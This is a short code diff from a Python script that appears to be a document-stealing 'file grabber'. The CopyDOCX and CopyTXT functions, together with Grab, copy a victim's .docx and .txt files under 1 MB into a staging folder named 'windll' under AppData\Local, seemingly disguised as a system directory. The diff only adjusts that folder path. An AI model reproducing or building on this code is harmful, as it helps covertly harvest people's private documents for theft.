@@ -32,7 +32,7 @@ def CopyDOCX(flist, path, count):
             print(flist[i])
             size = getsize(flist[i])
             if size < 1000000:
-                copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-5]}___{count}.docx')
+                copy2(flist[i],rf'{path}\windll\Files\File-Grubber\{fname[:-5]}___{count}.docx')
         except Exception as e:
                 print(e)
     print("done")
@@ -52,7 +52,7 @@ def CopyTXT(flist, path, count):
             print(flist[i])
             size = getsize(flist[i])
             if size < 1000000:
-                copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-4]}___{count}.txt')
+                copy2(flist[i],rf'{path}\windll\Files\File-Grubber\{fname[:-4]}___{count}.txt')
         except Exception as e:
                 print(e)
     print("done")
@@ -68,7 +68,7 @@ def Grab(data):
     try:
         mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
         try:
-            makedirs(rf'{mainPath}\windll\File-Grubber')
+            makedirs(rf'{mainPath}\windll\Files\File-Grubber')
         except:
             pass
         try:
